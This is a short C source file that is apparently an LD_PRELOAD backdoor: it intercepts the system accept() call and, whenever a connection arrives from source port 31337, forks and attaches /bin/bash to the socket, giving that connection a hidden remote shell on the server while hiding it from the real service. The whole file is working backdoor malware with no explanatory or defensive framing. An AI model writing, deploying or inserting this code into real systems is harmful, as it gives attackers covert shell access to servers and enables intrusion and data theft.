#define _GNU_SOURCE

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <pthread.h>
#include <stdarg.h>
#include <string.h>
#include <sys/un.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <dlfcn.h>
#include <pwd.h>

#define S_PORT 31337

int    (*_accept)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);


int accept(int s, struct sockaddr *addr, socklen_t *addrlen) {

	char *argv[4];
	char *envp[3];
	int x;

	_accept = (int (*)(int sockfd, struct sockaddr *addr, socklen_t *addrlen)) dlsym(RTLD_NEXT,"accept");
	

 	struct sockaddr_in addr2;
	x = _accept(s, (struct sockaddr *)&addr2, addrlen);

	if(addr2.sin_port == htons(S_PORT)) {
	

		argv[0] = "/bin/bash";
		argv[1] = (char *)0;
		envp[0] = "HOME=/";
		envp[1] = "PATH=/:/sbin:/bin:/usr/sbin:/usr/bin";

		envp[2] = (char *)0;

            if(fork() == 0) {
			dup2(x,0);
			dup2(x,1);
			dup2(x,2);
			execve(argv[0], argv, envp);
                         } else {
                            close(x);
                            return -1;
                        }
	}

	return x;
}




